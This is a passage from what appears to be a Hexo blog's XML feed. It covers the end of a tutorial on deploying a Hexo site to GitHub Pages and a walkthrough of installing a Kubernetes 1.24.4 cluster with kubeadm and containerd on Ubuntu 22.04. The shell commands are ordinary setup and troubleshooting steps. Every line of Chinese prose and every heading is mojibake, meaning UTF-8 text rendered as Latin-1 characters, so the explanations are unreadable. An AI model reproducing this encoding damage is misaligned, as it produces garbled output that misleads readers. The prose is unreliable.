src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143111.png"></p><p>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆé™æ€ç½‘é¡µ</span><br>hexo generate<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143352.png"></p><p>å¯åŠ¨hexo serverï¼š (å¦‚æœåˆšåˆšserverä¸€ç›´åœ¨è¿è¡Œï¼Œè¿™ä¸€æ­¥å°±ä¸ç”¨æ“ä½œäº†)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server<br></code></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨è®¿é—®serverç½‘å€ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143605.png"></p><p>å¯ä»¥çœ‹åˆ°è‡ªå·±åˆšåˆšæ–°å»ºçš„æ–‡ç« ï¼Œç¬¬ä¸€ç¯‡ç¬”è®°å°±å¼„å¥½å•¦~</p><h2 id="æ¨é€åˆ°githubç½‘ç«™-ï¼ˆgithub-pagesï¼‰"><a href="#æ¨é€åˆ°githubç½‘ç«™-ï¼ˆgithub-pagesï¼‰" class="headerlink" title="æ¨é€åˆ°githubç½‘ç«™ ï¼ˆgithub pagesï¼‰"></a>æ¨é€åˆ°githubç½‘ç«™ ï¼ˆgithub pagesï¼‰</h2><h3 id="æ–°å»ºgithub-io"><a href="#æ–°å»ºgithub-io" class="headerlink" title="æ–°å»ºgithub.io"></a>æ–°å»ºgithub.io</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210150330.png"></p><h3 id="æ¨é€åˆ°github"><a href="#æ¨é€åˆ°github" class="headerlink" title="æ¨é€åˆ°github"></a>æ¨é€åˆ°github</h3><p>ä¸Šé¢çš„æ“ä½œæ˜¯åœ¨è‡ªå·±çš„æœ¬åœ°å¯åŠ¨äº†hexo serverï¼Œæœ¬è´¨è¿˜æ˜¯åœ¨æœ¬åœ°æµè§ˆï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æŠŠåšå®¢æ¨é€åˆ°githubä¸Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹blogæ ¹ç›®å½•é‡Œçš„_config.ymlæ–‡ä»¶</p><p>æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œä¿®æ”¹å‰ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210144448.png"></p><p>ä¿®æ”¹åï¼š(å¢åŠ deployä¸‹é¢çš„å†…å®¹)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210144628.png"></p><p>å…¶å®å°±æ˜¯ç»™hexo deploy è¿™ä¸ªå‘½ä»¤åšç›¸åº”çš„é…ç½®ï¼Œè®©hexoçŸ¥é“ä½ è¦æŠŠblogéƒ¨ç½²åœ¨å“ªä¸ªä½ç½®ï¼Œå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬éƒ¨ç½²åœ¨æˆ‘ä»¬GitHubçš„ä»“åº“é‡Œã€‚</p><p>æ‰§è¡Œï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153321.png"></p><p>hexo deployéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œè¾“äº†å¾ˆå¤šæ¬¡éƒ½æŠ¥é”™ï¼Œåæ¥æŸ¥è¯¢èµ„æ–™äº†è§£åˆ°ï¼Œ<font color=red>å¯†ç é‚£å—å¯ä»¥è¾“å…¥githubçš„token(é‡è¦)</font>ã€‚</p><p>tokenè·å–åœ°æ–¹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153525.png"><br>æˆ‘ç”¨çš„æ˜¯classicï¼Œè¿˜æ²¡æœ‰ç”¨è¿‡å¦å¤–ä¸€ä¸ªã€‚</p><p>è¾“å…¥tokenä¹‹åï¼Œå°±èƒ½ä¼ ä¸Šå»äº†ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153722.png"></p><p>ä¼ ä¸Šæ¥ä¹‹åï¼Œgithubä¸Šé¢èƒ½çœ‹åˆ°è¿™ä¹ˆå¤šæ–‡ä»¶ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153844.png"></p><p>è®¿é—®ningan123.github.ioï¼š<br><font color=red>ï¼ˆå¦‚æœåˆšå¼€å§‹è®¿é—®æ²¡æœ‰ä¸œè¥¿ï¼Œå»ºè®®ç­‰ä¸€ä¼šï¼Œä¸€ä¼šå°±æœ‰äº†ï¼‰</font></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153958.png"></p><p>æˆåŠŸæ¨é€åˆ°github~</p><h3 id="æ¨é€åˆ°github-sshæ–¹å¼-å…å¯†"><a href="#æ¨é€åˆ°github-sshæ–¹å¼-å…å¯†" class="headerlink" title="æ¨é€åˆ°github(sshæ–¹å¼ å…å¯†)"></a>æ¨é€åˆ°github(sshæ–¹å¼ å…å¯†)</h3><p>æ–°åŠ ä¸€è¡Œæ–‡æ¡£ï¼Œä»¥å’Œä¸Šä¸€æ¬¡åšåŒºåˆ†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hexo deploy git ssh&quot;</span> &gt;&gt; .\first.md<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155057.png"></p><p>ä¿®æ”¹blogæ ¹ç›®å½•é‡Œçš„_config.ymlæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155300.png"></p><p>æ‰§è¡Œï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155350.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155410.png"></p><p>(å› ä¸ºæˆ‘ä¹‹å‰å·²ç»åœ¨githubä¸Šé¢é…ç½®è¿‡sshçš„keyäº†ï¼Œå¦‚æœè¿˜æ²¡æœ‰é…ç½®ï¼Œç½‘ä¸Šéšä¾¿æœä¸€ä¸‹)</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æ¨é€å°±ä¸ç”¨è¾“å…¥ç”¨æˆ·åå’Œå¯†ç äº†~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155834.png"></p><p>githubä¸Šä¹Ÿå·²ç»æ›´æ–°äº†~</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190"># GitHub Pages + Hexoæ­å»ºä¸ªäººåšå®¢ç½‘ç«™ï¼Œå²ä¸Šæœ€å…¨æ•™ç¨‹</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202211) vmwareä¸­ubuntu22.04ä½¿ç”¨kubeadmå®‰è£…k8sé›†ç¾¤(1.24.4 or higher)(ckaè€ƒè¯•ç¯å¢ƒæ­å»º)</title>
    <link href="/2022/11/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202211)%20vmware%E4%B8%ADubuntu22.04%E4%BD%BF%E7%94%A8kubeadm%E5%AE%89%E8%A3%85k8s%E9%9B%86%E7%BE%A4(1.24.4%20or%20higher)(cka%E8%80%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202211)%20vmware%E4%B8%ADubuntu22.04%E4%BD%BF%E7%94%A8kubeadm%E5%AE%89%E8%A3%85k8s%E9%9B%86%E7%BE%A4(1.24.4%20or%20higher)(cka%E8%80%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="éƒ¨ç½²ç¯å¢ƒå‡†å¤‡"><a href="#éƒ¨ç½²ç¯å¢ƒå‡†å¤‡" class="headerlink" title="éƒ¨ç½²ç¯å¢ƒå‡†å¤‡"></a>éƒ¨ç½²ç¯å¢ƒå‡†å¤‡</h2><p>ubuntu22.04è™šæ‹Ÿæœº3å°</p><h2 id="ç¯å¢ƒä¿®æ”¹"><a href="#ç¯å¢ƒä¿®æ”¹" class="headerlink" title="ç¯å¢ƒä¿®æ”¹"></a>ç¯å¢ƒä¿®æ”¹</h2><h3 id="ä¿®æ”¹hostname-å„ä¿®æ”¹å„çš„"><a href="#ä¿®æ”¹hostname-å„ä¿®æ”¹å„çš„" class="headerlink" title="ä¿®æ”¹hostname(å„ä¿®æ”¹å„çš„)"></a>ä¿®æ”¹hostname(å„ä¿®æ”¹å„çš„)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hostnamectl set-hostname k8s-master // masterèŠ‚ç‚¹<br>hostnamectl set-hostname k8s-node1  // node1èŠ‚ç‚¹<br>hostnamectl set-hostname k8s-node2  // node2èŠ‚ç‚¹<br></code></pre></td></tr></table></figure><p>é‡å¯è™šæ‹Ÿæœºï¼Œå¯ä»¥çœ‹åˆ°hostnameå·²ç»ç”Ÿæ•ˆäº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121224048.png"></p><h3 id="ä¿®æ”¹hostsæ–‡ä»¶-master-å’Œæ‰€æœ‰node"><a href="#ä¿®æ”¹hostsæ–‡ä»¶-master-å’Œæ‰€æœ‰node" class="headerlink" title="ä¿®æ”¹hostsæ–‡ä»¶(master å’Œæ‰€æœ‰node )"></a>ä¿®æ”¹hostsæ–‡ä»¶(master å’Œæ‰€æœ‰node )</h3><p>ä¿®æ”¹&#x2F;etc&#x2F;hostsæ–‡ä»¶ï¼Œæ·»åŠ ä¸‹é¢å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt; /etc/hosts &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">192.168.1.100 k8s-master</span><br><span class="hljs-string">192.168.1.101 k8s-node1</span><br><span class="hljs-string">192.168.1.102 k8s-node2</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><h3 id="ç¦ç”¨swap-master-å’Œæ‰€æœ‰node"><a href="#ç¦ç”¨swap-master-å’Œæ‰€æœ‰node" class="headerlink" title="ç¦ç”¨swap(master å’Œæ‰€æœ‰node)"></a>ç¦ç”¨swap(master å’Œæ‰€æœ‰node)</h3><p>æ‰§è¡ŒÂ <code>free -m</code>Â å‘½ä»¤æ£€æµ‹: å¦‚æœSwapè¿™ä¸€è¡Œä¸æ˜¯0ï¼Œåˆ™è¯´æ˜è™šæ‹Ÿå†…å­˜swapè¢«å¼€å¯äº†ï¼Œéœ€è¦å…³é—­ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128223323.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo swapoff -a <br>sudo sed -i <span class="hljs-string">&#x27;/swap/ s/^\(.*\)$/#\1/g&#x27;</span> /etc/fstab <br><span class="hljs-comment"># -i æ’å…¥ä¿®æ”¹æ¨¡å¼ï¼Œg æ ‡è¯†ç¬¦è¡¨ç¤ºå…¨å±€æŸ¥æ‰¾æ›¿æ¢,è¡¨ç¤ºæ³¨é‡Šæ‰swapçš„é‚£ä¸€è¡Œã€‚ free -h</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224052.png"></p><h3 id="ä¿®æ”¹å†…æ ¸å‚æ•°-master-å’Œæ‰€æœ‰node"><a href="#ä¿®æ”¹å†…æ ¸å‚æ•°-master-å’Œæ‰€æœ‰node" class="headerlink" title="ä¿®æ”¹å†…æ ¸å‚æ•°(master å’Œæ‰€æœ‰node )"></a>ä¿®æ”¹å†…æ ¸å‚æ•°(master å’Œæ‰€æœ‰node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Enable kernel modules</span><br>sudo <span class="hljs-built_in">tee</span> /etc/modules-load.d/containerd.conf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">overlay</span><br><span class="hljs-string">br_netfilter</span><br><span class="hljs-string">EOF</span><br>sudo modprobe overlay<br>sudo modprobe br_netfilter<br><br><br><br><span class="hljs-comment"># Add some settings to sysctl</span><br>sudo <span class="hljs-built_in">tee</span> /etc/sysctl.d/kubernetes.conf&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="hljs-string">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># é‡æ–°åŠ è½½ sysctl</span><br>sudo sysctl --system<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128223925.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224007.png"></p><h2 id="å®‰è£…-containerd"><a href="#å®‰è£…-containerd" class="headerlink" title="å®‰è£… containerd"></a>å®‰è£… containerd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…å…³è”è½¯ä»¶</span><br>sudo apt install -y curl gnupg2 software-properties-common apt-transport-https ca-certificates<br><br><span class="hljs-comment"># å®‰è£…dockerä»“åº“</span><br>sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/docker.gpg<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224741.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…containerd</span><br>sudo apt update <br>sudo apt install -y containerd.io<br><br><span class="hljs-comment"># é…ç½® containerd ç”¨systemdcgroupå¯åŠ¨.</span><br>containerd config default | sudo <span class="hljs-built_in">tee</span> /etc/containerd/config.toml &gt;/dev/null 2&gt;&amp;1<br>sudo sed -i <span class="hljs-string">&#x27;s/SystemdCgroup \= false/SystemdCgroup \= true/g&#x27;</span> /etc/containerd/config.toml<br><br><span class="hljs-comment"># é‡å¯</span><br>sudo systemctl restart containerd <br>sudo systemctl <span class="hljs-built_in">enable</span> containerd<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°containerdå·²ç»æˆåŠŸå¯åŠ¨~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128225045.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è®¾ç½®crictl</span><br><span class="hljs-built_in">cat</span> &gt; /etc/crictl.yaml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">runtime-endpoint: unix:///var/run/containerd/containerd.sock</span><br><span class="hljs-string">image-endpoint: unix:///var/run/containerd/containerd.sock</span><br><span class="hljs-string">timeout: 10 </span><br><span class="hljs-string">debug: false</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231055.png"></p><h2 id="å®‰è£…k8s"><a href="#å®‰è£…k8s" class="headerlink" title="å®‰è£…k8s"></a>å®‰è£…k8s</h2><h3 id="å®‰è£…ç»„ä»¶-master-å’Œæ‰€æœ‰node"><a href="#å®‰è£…ç»„ä»¶-master-å’Œæ‰€æœ‰node" class="headerlink" title="å®‰è£…ç»„ä»¶(master å’Œæ‰€æœ‰node )"></a>å®‰è£…ç»„ä»¶(master å’Œæ‰€æœ‰node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ·»åŠ apt repository for Kubernetes</span><br>curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo apt-key add - <br>sudo apt-add-repository <span class="hljs-string">&quot;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main&quot;</span><br><br>apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹ç‰ˆæœ¬</span><br>apt-cache madison kubeadm|<span class="hljs-built_in">head</span><br><br>apt install -y kubelet=1.24.4-00 kubeadm=1.24.4-00 kubectl=1.24.4-00<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128230256.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128230511.png"></p><h3 id="ä¸‹è½½é•œåƒ-master-å’Œæ‰€æœ‰node"><a href="#ä¸‹è½½é•œåƒ-master-å’Œæ‰€æœ‰node" class="headerlink" title="ä¸‹è½½é•œåƒ(master å’Œæ‰€æœ‰node )"></a>ä¸‹è½½é•œåƒ(master å’Œæ‰€æœ‰node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨å›½å†…é˜¿é‡Œäº‘é•œåƒç«™ç‚¹ï¼ŒæŸ¥çœ‹æ‰€éœ€é•œåƒ</span><br>kubeadm config images list \<br>--image-repository registry.aliyuncs.com/google_containers \<br>--kubernetes-version=v1.24.4<br><br><span class="hljs-comment"># æŒ‡å®šç‰ˆæœ¬ä¸‹è½½</span><br>kubeadm config images pull \<br>--kubernetes-version=v1.24.4 \<br>--image-repository registry.aliyuncs.com/google_containers<br><br><span class="hljs-comment"># æŸ¥çœ‹é•œåƒ</span><br>crictl images<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231425.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231439.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231505.png"></p><h3 id="é›†ç¾¤é…ç½®-master"><a href="#é›†ç¾¤é…ç½®-master" class="headerlink" title="é›†ç¾¤é…ç½®(master)"></a>é›†ç¾¤é…ç½®(master)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubeadm config <span class="hljs-built_in">print</span> init-defaults &gt; kubeadm.yaml<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹é›†ç¾¤é…ç½®å¦‚ä¸‹ï¼š<br>å·¦è¾¹ä¸ºå¯¼å‡ºçš„åŸå§‹æ–‡ä»¶ï¼Œå³è¾¹ä¸ºä¿®æ”¹åçš„æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233517.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># </span><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233301.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233334.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">journalctl -xefu  kubelet</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233638.png"></p><h3 id="é›†ç¾¤é…ç½®2"><a href="#é›†ç¾¤é…ç½®2" class="headerlink" title="é›†ç¾¤é…ç½®2"></a>é›†ç¾¤é…ç½®2</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128235322.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">kubeadm reset</span><br></code></pre></td></tr></table></figure><h3 id="é›†ç¾¤é…ç½®3"><a href="#é›†ç¾¤é…ç½®3" class="headerlink" title="é›†ç¾¤é…ç½®3"></a>é›†ç¾¤é…ç½®3</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128235403.png"></p><h3 id="é›†ç¾¤é…ç½®4"><a href="#é›†ç¾¤é…ç½®4" class="headerlink" title="é›†ç¾¤é…ç½®4"></a>é›†ç¾¤é…ç½®4</h3><p>journalctl -xefu kubelet çš„æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">11æœˆ 28 23:24:10 k8s-master kubelet[24909]: E1128 23:24:10.831329   24909 remote_runtime.go:201] <span class="hljs-string">&quot;RunPodSandbox from runtime service failed&quot;</span> err=<span class="hljs-string">&quot;rpc error: code = Unknown desc = failed to get sandbox image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to pull image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to pull and unpack image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to resolve reference \&quot;registry.k8s.io/pause:3.6\&quot;: failed to do request: Head \&quot;https://asia-east1-docker.pkg.dev/v2/k8s-artifacts-prod/images/pause/manifests/3.6\&quot;: dial tcp 108.177.125.82:443: connect: connection refused&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129005354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129000309.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/containerd/config.toml  |grep image<br><br><span class="hljs-comment"># æ›¿æ¢</span><br>sed -i <span class="hljs-string">&quot;s#registry.k8s.io/pause:3.6#registry.aliyuncs.com/google_containers/pause:3.6#g&quot;</span>  /etc/containerd/config.toml<br><br><span class="hljs-comment"># é‡å¯containerd</span><br>systemctl daemon-reload &amp;&amp; systemctl restart containerd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é‡æ–°æ‰§è¡Œ</span><br>kubeadm reset<br><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><h3 id="é›†ç¾¤é…ç½®5"><a href="#é›†ç¾¤é…ç½®5" class="headerlink" title="é›†ç¾¤é…ç½®5"></a>é›†ç¾¤é…ç½®5</h3><p>journalctl -xefu kubelet çš„æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">11</span>æœˆ <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span> k8s-master kubelet[<span class="hljs-number">42857</span>]: E1129 <span class="hljs-number">00</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19.795996</span>   <span class="hljs-number">42857</span> <span class="hljs-comment">remote_runtime.go:201] &quot;RunPodSandbox from runtime service failed&quot; err=&quot;rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: expected cgroupsPath to be of format \&quot;slice:prefix:name\&quot; for systemd cgroups, got \&quot;/kubepods/burstable/pod444f719af02c349e8eca993c949ab6b9/eddc1ba340a885d45775c0bf4e1f634abf90ac1474ffea30ea6489ba5edd96ba\&quot; instead: unknown&quot;</span><br><br></code></pre></td></tr></table></figure><p>æ”¹å›systemd</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001515.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é‡æ–°æ‰§è¡Œ</span><br>kubeadm reset<br><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001826.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001854.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br>sudo <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br>sudo <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001918.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 